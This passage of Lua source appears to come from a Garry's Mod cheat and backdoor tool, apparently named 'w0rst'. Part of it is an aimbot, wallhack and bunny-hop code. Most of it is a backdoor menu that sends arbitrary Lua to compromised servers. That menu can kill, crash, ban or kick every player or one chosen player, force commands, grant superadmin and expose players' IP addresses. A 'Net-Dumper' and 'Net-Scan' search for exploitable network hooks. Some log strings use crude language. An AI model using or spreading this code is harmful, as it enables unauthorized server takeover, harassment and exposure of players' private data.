                        draw.SimpleText(name, "Default", position.x,position.y,Color(EntityColor.r, EntityColor.g, EntityColor.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                    end

                    if EntDistanceEnable then
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                        draw.SimpleText(distance, "Default", position.x,position.y,Color(EntityColor.r, EntityColor.g, EntityColor.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                    end

                    if Ent3DEnable then
                        local Position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        local eyeangles = ent:EyeAngles()
                        local min, max = ent:WorldSpaceAABB()
                        local origin = ent:GetPos()
                        cam.Start3D()
                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, Color(EntityColor.r, EntityColor.g, EntityColor.b) )
                        cam.End3D()
                        end
                    end
                end
            end
        end
    end

    for k,v in pairs (player.GetAll()) do
        if v ~= LocalPlayer() and v:IsValid() and v:Alive() and v:Health() > 0 then
            local ent=v

            if TracerEnable then
                surface.SetDrawColor(Color(TracerColor.r, TracerColor.b, TracerColor.g))
                surface.DrawLine(ScrW()/2,ScrH(),v:GetPos():ToScreen().x,v:GetPos():ToScreen().y)
            end

            if DistanceEnable then
                local position = (v:GetPos() + Vector(0,0,90)):ToScreen()
                local distance = math.Round(v:GetPos():Distance(LocalPlayer():GetPos()))
                draw.SimpleText(distance,"Default", position.x,position.y,Color(DistanceColor.r, DistanceColor.g, DistanceColor.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
            end

            if NameEnable then
                local position = ( v:GetPos() + Vector( 0,0,80 ) ):ToScreen()
                draw.SimpleText(v:Nick(),"Default",position.x,position.y,Color(NameColor.r, NameColor.g, NameColor.b),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
            end

            if WeaponEnable then
                if ent:GetActiveWeapon():IsValid() then
                    local weapon_name=ent:GetActiveWeapon():GetPrintName()
                    local Position = (v:GetPos() + Vector(0,0,-15)):ToScreen()
                    draw.SimpleText(weapon_name,"Default",Position.x,Position.y,Color(WeaponColor.r, WeaponColor.g, WeaponColor.b),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                end
            end

            if Box2DEnable then
                local min, max = v:GetCollisionBounds()
                local pos = v:GetPos()
                local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                local middle = bottom.y - top.y
                local width = middle / 2.425
                surface.SetDrawColor(Color(Box2DColor.r, Box2DColor.g, Box2DColor.b))
                surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
            end

            if SkeletonEnable then
                local Continue = true
                local Bones = {}

                for k, v in pairs(wtf.Bones) do
                    if ent:LookupBone(v) ~= nil and ent:GetBonePosition(ent:LookupBone(v)) ~= nil then
                        table.insert(Bones, ent:GetBonePosition(ent:LookupBone(v)):ToScreen())
                    else Continue=false; return end
                end

                if Continue then
                    surface.SetDrawColor(Color(SkeletonColor.r, SkeletonColor.g, SkeletonColor.b))
                    surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                    surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                    surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
                    surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
                    surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
                    surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
                    surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
                    surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
                    surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
                    surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
                end
            end

            if Box3DEnable then
                local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                local eyeangles = ent:EyeAngles()
                local min, max = ent:WorldSpaceAABB()
                local origin = ent:GetPos()

                cam.Start3D()
                    render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, Color(Box3DColor.r, Box3DColor.g, Box3DColor.b) )
                cam.End3D()
            end

            if WallhackEnable then
                cam.Start3D()
                    v:DrawModel()
                cam.End3D()
            end

            if ChamsEnable then
                local entitym = FindMetaTable("Entity")
                local weapon = ent:GetActiveWeapon()

                cam.Start3D()
                    cam.IgnoreZ(true)
                    entitym.DrawModel(v)
                    cam.IgnoreZ(false)
                cam.End3D()

                if weapon:IsValid() then
                cam.Start3D()
                    render.MaterialOverride(chams01)
                    render.SetColorModulation(ChamsColor.r/255, ChamsColor.g/255, ChamsColor.b/255, 255)
                    entitym.DrawModel(weapon)
                    render.SetColorModulation(ChamsColor.r/170, ChamsColor.g/170, ChamsColor.b/170, 255)
                    render.MaterialOverride(chams02)
                    entitym.DrawModel(weapon)
                cam.End3D()

                cam.Start3D()
                    render.MaterialOverride(chams01)
                    render.SetColorModulation(ChamsColor.b / 255, ChamsColor.r / 255, ChamsColor.g / 255)
                    entitym.DrawModel(v)
                    render.SetColorModulation(ChamsColor.r / 255, ChamsColor.g / 255, ChamsColor.b / 255)
                    render.MaterialOverride(chams02)
                    entitym.DrawModel(v)
                    render.SetColorModulation(1, 1, 1)
                cam.End3D()
                end
            end
        end
    end
end)

hook.Add("Think", PhysgunHook, function()
    if RainbowEnable then
        local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
      	LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
    end
end)

function wtf.bhop_loop(ply)
	if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
        ply:RemoveKey(IN_JUMP);
        if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
            if(ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400);
            else
                ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
                ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400);
            end
        end
    elseif(ply:KeyDown(IN_JUMP)) then
        ply:SetForwardMove(10000)
    end
end

hook.Add("Think", KeyHook, function()
    if input.IsKeyDown(KEY_INSERT) and !Menu:IsVisible() and !IsKeyDown then
        Menu:Show(); IsKeyDown=true
    elseif input.IsKeyDown(KEY_INSERT) and Menu:IsVisible() and !IsKeyDown then
       Menu:Hide(); IsKeyDown=true
    elseif !input.IsKeyDown(KEY_INSERT) then
        IsKeyDown=false
    end
end)

local function Aimbot(v)
    local ply = LocalPlayer()
    if v:IsValid() && v:IsPlayer() && v:Alive() && v ~= LocalPlayer() then
        if (input.IsKeyDown(KEY_LALT)) then
            local TargetHead = v:LookupBone(wtf.Bones[1])
            local TargetPos, TargetAngle = v:GetBonePosition(TargetHead)
            local Position = (TargetPos - ply:GetShootPos()):Angle()
            ply:SetEyeAngles(Position)
        end
    end
end

hook.Add("HUDPaint", AimbotHook, function()
		if AimbotEnable then
        local circle = surface.DrawCircle(FovPos.x, FovPos.y, FovCircle[1], Color(FovColor.r, FovColor.g, FovColor.b))
				for k, v in pairs(player.GetAll()) do
						local plrpos = v:GetPos():ToScreen()
						if (plrpos.x >= FovPos.x && plrpos.x <= FovPos.x + FovCircle[1]) && (plrpos.y >= FovPos.y && plrpos.y <= FovPos.y + FovCircle[1]) then
                Aimbot(v)
            end
				end
		end
end)

CreateButton("Refresh Ents", TabVisuals, 80, 25, 45, 160, function()
    RefreshEntList()
end)

CreateButton("Add Ent", TabVisuals, 80, 25, 130, 160, function()
  if EntOffList:GetSelectedLine() ~= nil then
      table.insert( EntList, EntOffList:GetLine(EntOffList:GetSelectedLine()):GetValue(1) )
  end; RefreshEntList()
end)

CreateButton("Remove Ent", TabVisuals, 80, 25, 215, 160, function()
    if EntOnList:GetSelectedLine() ~= nil then
        for k, v in pairs( EntList ) do
            if v == EntOnList:GetLine(EntOnList:GetSelectedLine()):GetValue(1) then
                table.remove( EntList, k )
            end
        end
    end; RefreshEntList()
end)

CreateButton("Add All", TabVisuals, 80, 25, 300, 160, function()
  for k, v in pairs( EntOffList:GetLines() ) do
      table.insert( EntList, v:GetValue(1) )
  end; RefreshEntList()
end)

CreateButton("Remove All", TabVisuals, 80, 25, 385, 160, function()
  table.Empty( EntList )
  RefreshEntList()
end)

CreateCheckbox("Plr-Tracer", TabVisuals, 22, 10, function()
    TracerEnable=not TracerEnable
    if(TracerEnable == false) then
        wtf.Log("Tracer Disabled")
    elseif(TracerEnable == true) then
        wtf.Log("Tracer Enabled")
    end
end)

CreateCheckbox("Plr-Distance", TabVisuals, 142, 10, function()
    DistanceEnable=not DistanceEnable
    if(DistanceEnable == false) then
        wtf.Log("Distance Disabled")
    elseif(DistanceEnable == true) then
        wtf.Log("Distance Enabled")
    end
end)

CreateCheckbox("Plr-Names", TabVisuals, 262, 10, function()
    NameEnable=not NameEnable
    if(NameEnable == false) then
        wtf.Log("Name Disabled")
    elseif(NameEnable == true) then
        wtf.Log("Name Enabled")
    end
end)

CreateCheckbox("Plr-Weapons", TabVisuals, 382, 10, function()
    WeaponEnable=not WeaponEnable
    if(WeaponEnable == false) then
        wtf.Log("Weapon Disabled")
    elseif(WeaponEnable == true) then
        wtf.Log("Weapon Enabled")
    end
end)

CreateCheckbox("Plr-2D-Box", TabVisuals, 22, 40, function()
    Box2DEnable=not Box2DEnable
    if(Box2DEnable == false) then
        wtf.Log("Box-2D Disabled")
    elseif(Box2DEnable == true) then
        wtf.Log("Box-2D Enabled")
    end
end)

CreateCheckbox("Plr-3D-Box", TabVisuals, 142, 40, function()
    Box3DEnable=not Box3DEnable
    if(Box3DEnable == false) then
        wtf.Log("Box-3D Disabled")
    elseif(Box3DEnable == true) then
        wtf.Log("Box-3D Enabled")
    end
end)

CreateCheckbox("Plr-Skeletons", TabVisuals, 262, 40, function()
    SkeletonEnable=not SkeletonEnable
    if(SkeletonEnable == false) then
        wtf.Log("Skeleton Disabled")
    elseif(SkeletonEnable == true) then
        wtf.Log("Skeleton Enabled")
    end
end)

CreateCheckbox("Plr-Chams", TabVisuals, 382, 40, function()
    ChamsEnable=not ChamsEnable
    if(ChamsEnable == false) then
        wtf.Log("Chams Disabled")
    elseif(ChamsEnable == true) then
        wtf.Log("Chams Enabled")
    end
end)

CreateCheckbox("Ent-Names", TabVisuals, 22, 70, function()
  EntNameEnable=not EntNameEnable
  if(EntNameEnable == false) then
      wtf.Log("Entity Names Disabled")
  elseif(EntNameEnable == true) then
      wtf.Log("Entity Names Enabled")
  end
end)

CreateCheckbox("Ent-Distance", TabVisuals, 142, 70, function()
  EntDistanceEnable=not EntDistanceEnable
  if(EntDistanceEnable == false) then
      wtf.Log("Entity Distance Disabled")
  elseif(EntDistanceEnable == true) then
      wtf.Log("Entity Distance Enabled")
  end
end)

CreateCheckbox("Ent-3D (D)", TabVisuals, 262, 70, function()
  Ent3DEnable=not Ent3DEnable
  if(Ent3DEnable == false) then
      wtf.Log("Entity 3D-Boxes Disabled")
  elseif(Ent3DEnable == true) then
      wtf.Log("Entity 3D-Boxes Enabled")
  end
end)

CreateCheckbox("Wallhack", TabVisuals, 382, 70, function()
    WallhackEnable=not WallhackEnable
    if(WallhackEnable == false) then
        wtf.Log("Wallhack Disabled")
    elseif(WallhackEnable == true) then
        wtf.Log("Wallhack Enabled")
    end
end)

CreateCheckbox("Free Camera", TabVisuals, 22, 100, function()
    FC.Enabled=not FC.Enabled
    if FC.Enabled then
        wtf.Log("Freecam Enabled")
    else
        wtf.Log("Freecam Disabled")
    end
    FC.LockView=FC.Enabled
    FC.SetView=true
end)

CreateButton("Save Visuals", TabMisc, 110, 25, 395, 250, function()
    local tc = TracerColor.r.." "..TracerColor.g.." "..TracerColor.b
    local dc = DistanceColor.r.." "..DistanceColor.g.." "..DistanceColor.b
    local nc = NameColor.r.." "..NameColor.g.." "..NameColor.b
    local wc = WeaponColor.r.." "..WeaponColor.g.." "..WeaponColor.b
    local bc = Box2DColor.r.." "..Box2DColor.g.." "..Box2DColor.b
    local sc = SkeletonColor.r.." "..SkeletonColor.g.." "..SkeletonColor.b
    local dbc = Box3DColor.r.." "..Box3DColor.g.." "..Box3DColor.b
    local cc = ChamsColor.r.." "..ChamsColor.g.." "..ChamsColor.b
    local ec = EntityColor.r.." "..EntityColor.g.." "..EntityColor.b
    local fc = FovColor.r.." "..FovColor.g.." "..FovColor.b

    wtf.Log("Visuals Saved")
    file.Write("w0rst/visuals.txt", tc..","..dc..","..nc..","..wc..","..bc..","..sc..","..dbc..","..cc..","..ec..","..fc)
end)

CreateButton("Load Visuals", TabMisc, 110, 25, 280, 250, function()
    if not file.Exists("w0rst/visuals.txt", "DATA") then
        wtf.Log("File Not Found"); wtf.conoutRGB("VISUALS FILE NOT FOUND")
    else
        wtf.Log("Visuals Loaded"); wtf.conoutRGB("VISUALS LOADED")
        local f = file.Read("w0rst/visuals.txt")
        local lines = string.Split(f, ",")
        local tc,dc,nc = string.Split(lines[1], " "), string.Split(lines[2], " "), string.Split(lines[3], " ")
        local wc,bc,sc = string.Split(lines[4], " "), string.Split(lines[5], " "), string.Split(lines[6], " ")
        local dbc, cc, ec = string.Split(lines[7], " "), string.Split(lines[8], " "), string.Split(lines[9], " ")
        local fc = string.Split(lines[10], " ")

        TracerSlider[1]:SetValue(tc[1]); TracerSlider[2]:SetValue(tc[2]); TracerSlider[3]:SetValue(tc[3])
        DistanceSlider[1]:SetValue(dc[1]); DistanceSlider[2]:SetValue(dc[2]); DistanceSlider[3]:SetValue(dc[3])
        NameSlider[1]:SetValue(nc[1]); NameSlider[2]:SetValue(nc[2]); NameSlider[3]:SetValue(nc[3])
        WeaponSlider[1]:SetValue(wc[1]); WeaponSlider[2]:SetValue(wc[2]); WeaponSlider[3]:SetValue(wc[3])
        Box2DSlider[1]:SetValue(bc[1]); Box2DSlider[2]:SetValue(bc[2]); Box2DSlider[3]:SetValue(bc[3])
        SkeletonSlider[1]:SetValue(sc[1]); SkeletonSlider[2]:SetValue(sc[2]); SkeletonSlider[3]:SetValue(sc[3])
        Box3DSlider[1]:SetValue(dbc[1]); Box3DSlider[2]:SetValue(dbc[2]); Box3DSlider[3]:SetValue(dbc[3])
        ChamsSlider[1]:SetValue(cc[1]); ChamsSlider[2]:SetValue(cc[2]); ChamsSlider[3]:SetValue(cc[3])
        EntitySlider[1]:SetValue(ec[1]); EntitySlider[2]:SetValue(ec[2]); EntitySlider[3]:SetValue(ec[3])
        FovSlider[1]:SetValue(fc[1]); FovSlider[2]:SetValue(fc[2]); FovSlider[3]:SetValue(fc[3])
    end
end)

CreateBDServer("Kill All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
    wtf.Log("Everyone Killed")
end)

CreateBDServer("Fling All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
    wtf.Log("Everyone Flung")
end)

CreateBDServer("Ignite All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
    wtf.Log("Everyone Ignited")
end)

CreateBDServer("Extinguish All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
    wtf.Log("Everyone Extinguished")
end)

CreateBDServer("Ban All", function()
     wtf.Log("Everyone Banned")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:Ban(9999999999, false)
            v:Kick()
        end
    ]])
end)

CreateBDServer("Kick All", function()
     wtf.Log("Everyone Kicked")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:Kick()
        end
    ]])
end)

CreateBDServer("Retry All", function()
    wtf.Log("Everyone Retry'd")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('retry')
        end
    ]])
end)

CreateBDServer("Crash All", function()
    wtf.Log("Everyone Crashed")
    wtf.SendLua([[
        local id = Player(]]..LocalPlayer():UserID()..[[)
        for k,v in pairs(player.GetAll()) do
            if v:Nick() ~= id:Nick() then
                v:SendLua("function die() return die() end die()")
            end
        end
    ]])
end)

CreateBDServer("Teleport All",  function()
    wtf.Log("Everyone Teleported")
    wtf.SendLua([[
			for k,v in pairs(player.GetAll()) do
				local tps = v:GetEyeTraceNoCursor().HitPos
				v:SetPos(tps)
			end
        ]])
end)

CreateBDServer("Speed All", function()
    Derma_StringRequest("Set Speed All", "Set Everyones Speed To: ", "", function(str)
        wtf.Log("Speed Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetMaxSpeed(]]..str..[[)
                v:SetRunSpeed(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Dance All",  function()
    wtf.Log("Everyone's Dancing")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        end
    ]])
end)

CreateBDServer("Force Say All", function()
    Derma_StringRequest("Force Everyone To Chat", "Message To Chat:", "",function(str)
        wtf.Log("Everyone Just Said: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:Say("]]..str..[[")
            end
        ]])
    end)
end)

CreateBDServer("Encony fucker!!", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
		wtf.Log("Eco got raped cuh!!")
end)

CreateBDServer("Console Say", function()
    Derma_StringRequest("Console Say", "Make Console Say In Chat: ", "", function(str)
        wtf.Log("Console Said: "..str)
        wtf.SendLua([[RunConsoleCommand("say",']]..str..[[')]])
    end)
end)

CreateBDServer("Size All", function()
    Derma_StringRequest("Size Everyone", "Set The Size Of Everyone To:", "", function(str)
        wtf.Log("Everyones Size: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetModelScale(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("ConCommand All", function()
    Derma_StringRequest("ConCommand All", "Text To Run(eg: retry):", "", function(str)
        wtf.Log("Ran Command: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:ConCommand(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("JumpPower All", function()
    Derma_StringRequest("JumpPower All", "JumpPower To Set All:", "", function(str)
        wtf.Log("Everyones JumpPower: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetJumpPower(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Break Glass", function()
  wtf.Log("Glass Breaking funni!")
		wtf.SendLua([[
			for k,v in pairs(player.GetAll()) do
				v:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
			end
		]])
	end)

CreateBDServer("God All", function()
    wtf.Log("Everyones God")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
        end
    ]])
end)

CreateBDServer("UnGod All", function()
    wtf.Log("Everyones UnGoded")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:GodDisable()
        end
    ]])
end)

CreateBDServer("Stopsound All", function()
    wtf.Log("Stopped All Sound")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('stopsound')
        end
    ]])
end)

CreateBDServer("Moan All", function()
    wtf.Log("Everyone Moaned")
    wtf.SendLua([[
    for k,v in pairs(player.GetAll()) do
        v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
    end
    ]])
end)

CreateBDServer("Blind All", function()
    wtf.Log("Everyone Blinded")
    wtf.SendLua([[BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")]])
end)

CreateBDServer("UnBlind All", function()
    wtf.Log("Everyone UnBlinded")
    wtf.SendLua([[BroadcastLua("hook.Remove('HUDPaint','Blindness')")]])
end)

CreateBDServer("Health All", function()
    Derma_StringRequest("Health All", "Health To Set To:", "", function(str)
        wtf.Log("Everyones Health Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetHealth(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Armor All", function()
    Derma_StringRequest("Armor All", "Armor To Set To:", "", function(str)
        wtf.Log("Everyones Armor Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetArmor(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDClient("Kill", function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Killed: "..Player(plr):Nick())
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:Kill()
            me:Spawn()
        ]])
    end
end)

CreateBDClient("Fling", function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Flung: "..Player(plr):Nick())
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
        ]])
    end
end)

CreateBDClient("Set Speed",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
            wtf.Log(Player(plr):Nick().." Speed Set")
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:SetMaxSpeed(]]..str..[[)
                me:SetRunSpeed(]]..str..[[)
            ]])
        end)
    end
end)

CreateBDClient("Give Item",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("Give Item", "Give Item Named:", "", function(str)
            wtf.Log("Item Given To: "..Player(plr):Nick())
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:Give(']]..str..[[')
            ]])
        end)
    end
end)

CreateBDClient("Crash Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.SendLua([[
            Player(]]..plr..[[):SendLua("function die() return die() end die()")
        ]])
        wtf.Log("Player: "..Player(plr):Nick().." Crashed")
    end
end)

CreateBDClient("Force Say",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:Say("]]..str..[[")
            ]])
            wtf.Log("Player: "..Player(plr):Nick().." Said "..str)
        end)
    end
end)

CreateBDClient("NoClip Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            if me:GetMoveType() ~= MOVETYPE_NOCLIP then
                me:SetMoveType(MOVETYPE_NOCLIP)
            else
                me:SetMoveType(MOVETYPE_WALK)
            end
        ]])

        if Player(plr):GetMoveType() == MOVETYPE_NOCLIP then
            wtf.Log("Noclip Off")
        else
            wtf.Log("Noclip On")
        end
    end
end)

CreateBDClient("Set Usergroup",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("Set Usergroup", "ex: superadmin", "", function(str)
            wtf.Log("Player: "..Player(plr):Nick().." Usergroup: "..str)
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:SetUserGroup("]]..str..[[")
            ]])
        end)
    end
end)

CreateBDClient("God Enable",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Player: "..Player(plr):Nick().." Godded")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:GodEnable()
        ]])
    end
end)

CreateBDClient("God Disable",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Player: "..Player(plr):Nick().." UnGodded")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:GodDisable()
        ]])
    end
end)

CreateBDClient("Ban Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Player"..Player(plr):Nick().." Banned")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:Ban(999999999,false)
            me:Kick()
        ]])
    end
end)

CreateBDClient("Kick Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Player "..Player(plr):Nick().." Kicked")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:Kick()
        ]])
    end
end)

CreateBDClient("Retry Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Player "..Player(plr):Nick().." Retry'd")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:ConCommand('retry')
        ]])
    end
end)

CreateBDClient("Print Ip",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Players IPs Logged")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            local ply = ]]..LocalPlayer():UserID()..[[
            Player(ply):ChatPrint("Player: " .. me:Nick() .. " (" .. me:SteamID() .. ") IP: " .. me:IPAddress())
        ]])
    end
end)

CreateBDClient("Dance Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Players: "..Player(plr):Nick().." Dancing")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            me:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        ]])
    end
end)

CreateBDClient("Size Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("Set Size", "Players Size:", "", function(str)
            wtf.Log("Player: "..Player(plr):Nick().." Size:"..str)
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:SetModelScale(']]..str..[[')
            ]])
        end)
    end
end)

CreateBDClient("ConCommand Player",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        Derma_StringRequest("ConCommand", "String To Run In Console:", "", function(str)
            wtf.Log("Ran Command: "..str.." Player: "..Player(plr):Nick())
            wtf.SendLua([[
                local me = Player(]]..plr..[[)
                me:ConCommand(']]..str..[[')
            ]])
        end)
    end
end)

CreateBDClient("IP Say",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("They Said There Ip")
        wtf.SendLua([[
      			local me = Player(]]..plr..[[)
      			me:Say("My IP Is: "..me:IPAddress())
        ]])
    end
end)

CreateBDClient("Drop Weapon",  function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("They Dropped Their Weapon")
        wtf.SendLua([[
            local me = Player(]]..plr..[[)
            if me:GetActiveWeapon() ~= nil then
                me:DropWeapon(me:GetActiveWeapon())
            end
        ]])
    end
end)

CreateBDClient("Explode Player", function()
    if plr == nil then do wtf.Log("No Player Selected") return end else
        wtf.Log("Exploded "..Player(plr):Nick())
        wtf.SendLua([[
            local explo = ents.Create("env_explosion")
            local me = Player(]]..plr..[[)

                explo:SetOwner(me)
                explo:SetPos(me:GetPos())
                explo:SetKeyValue("iMagnitude", "250")
                explo:Spawn()
                explo:Activate()
                explo:Fire("Explode", "", 0)

            if me:Alive() then
                me:Kill()
            end
        ]])
    end
end)

CreateButton("Net-Scan", TabBackdoor, 115, 30, 19, 517, function()
    wtf.CheckWebNets()
end)

CreateButton("Select-Net", TabBackdoor, 115, 30, 139, 517, function()
    Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
        if wtf.CheckNet(str) then
            SelectedNet=str
            wtf.Log("Selected Net "..str)
            wtf.conoutRGB("NET SELECTED: "..str)
        else
            wtf.Log("Invalid Net")
            wtf.conoutRGB("NET INVALID")
        end
    end)
end)

CreateButton("Add-Net", TabBackdoor, 115, 30, 259, 517, function()
    Derma_StringRequest("Add Net | Staff Use Only", "Net To Add:", "", function(str)
        wtf.AddNet(str)
    end)
end)

CreateButton("Run Lua", TabBackdoor, 115, 30, 379, 517, function()
    if(SelectedNet ~= "NONE") then
        _G.net.Start(SelectedNet)
        _G.net.WriteString(LuaEditor:GetValue())
        _G.net.WriteBit(false)
        _G.net.SendToServer(); wtf.Log("Ran Lua - Server")
    else
        wtf.Log("No Net Selected")
    end
end)

CreateButton("Adv-Bhop", TabMisc, 110, 25, 20, 10, function()
    if(BhopEnable == false) then
        wtf.Log("Bhop Enabled")
        hook.Add("CreateMove", BhopHook, function(ply) wtf.bhop_loop(ply) end);
        BhopEnable=true
    else
        wtf.Log("Bhop Disabled")
        hook.Remove("CreateMove", BhopHook)
        BhopEnable=false
    end
end)

CreateButton("Net-Dumper", TabMisc, 110, 25, 140, 10, function()
    local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
    if file.Exists(name, "DATA") then
        file.Delete(name)
    end

    for i=1,10000 do
        if util.NetworkIDToString(i) then
            if file.Exists(name, "DATA") then
                file.Append(name, "\n"..util.NetworkIDToString(i).." - "..i)
            else
                file.Write(name, GetHostName()..[[ - ]]..game.GetIPAddress().."\n"..util.NetworkIDToString(i).." - "..i)
            end
        end
    end

